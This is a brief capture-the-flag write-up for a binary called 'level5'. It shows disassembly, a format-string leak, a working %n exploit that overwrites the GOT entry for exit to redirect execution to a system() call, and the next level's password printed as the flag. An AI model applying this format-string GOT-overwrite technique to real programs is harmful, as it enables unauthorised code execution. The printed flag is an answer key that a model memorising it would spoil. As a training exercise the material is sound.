# level5

## disassemble

```shell
objdump -dC -M intel level5
```

## Exploit

``` shell
python2.7 -c 'print("BBBB" + " %p"*4)'  | ./level5
```

``` shell
readelf -r level5
    [...]
    08049838  00000607 R_386_JUMP_SLOT   00000000   exit
    [...]

objdump -d level5 
    080483d0 <exit@plt>:
        80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
        80483d6:       68 28 00 00 00          push   $0x28
        80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>

    080484a4 <o>:
        80484a4:       55                      push   %ebp
        80484a5:       89 e5                   mov    %esp,%ebp
        80484a7:       83 ec 18                sub    $0x18,%esp
        80484aa:       c7 04 24 f0 85 04 08    movl   $0x80485f0,(%esp)
        80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
        80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
        80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>
```

``` shell
python2.7 -c 'print("\xd0\x83\x04\x08" + " %p"*4)'  | ./level5
```

```shell
# Hexadecimal to Decimal
# 0x080484a4  -> 134513828
# 134513828 - 4 = 134513824

python2.7 -c 'print("\x38\x98\x04\x08" + "%134513824x" "%4$n")' > /tmp/exploit.txt
cat /tmp/exploit.txt /dev/stdin | ./level5
cat /tmp/exploit.txt - | ./level5
```

## flag

```shell
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
